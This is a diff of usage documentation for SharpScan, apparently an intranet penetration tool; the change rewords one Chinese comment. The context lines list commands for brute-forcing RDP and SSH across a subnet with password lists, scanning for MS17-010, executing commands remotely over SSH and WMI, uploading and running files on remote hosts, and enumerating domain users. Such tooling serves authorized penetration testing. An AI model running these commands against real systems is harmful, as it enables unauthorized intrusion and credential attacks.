@@ -141,7 +141,7 @@ SharpScan.exe -h 192.168.244.1/24 -m rdp -uf user.txt -pwf pass.txt   (用账号
 SharpScan.exe -h 192.168.244.1/24 -m ssh -uf user.txt -pwf pass.txt   (用账号密码本爆破C段的ssh服务()
 SharpScan.exe -h 192.168.244.1/24 -m ms17010                           (C段批量扫描是否存在ms17010)
 SharpScan.exe -h 192.168.244.1/24 -m ssh -u root -pw a -c "uname-a"   (ssh命令执行C段枚举）
-SharpScan.exe -h 192.168.244.1.3 -m wmiexec -f cmd -c "ls C:\\Windows"  (调用WMI远程执行命令，通过注册表传递数据)
+SharpScan.exe -h 192.168.244.1.3 -m wmiexec -f cmd -c "ls C:\\Windows"  (远程执行命令，通过注册表传递数据)
 SharpScan.exe -h 192.168.244.1.3 -m wmiexec -func upload -l C:\a.exe -r C:\\Windows\a.exe    (上传文件到远程主机，-l是本地文件路径，-r是上传到远程主机的文件路径)
 SharpScan.exe -h 192.168.244.1.3 -m wmiexec -func uploadexec -l C:\a.exe -r C:\\Windows\a.exe (上传文件到远程主机并且执行文件)
 SharpScan.exe -h 192.168.244.1.3 -m userenum -uf user.txt                   (域内枚举用户名)
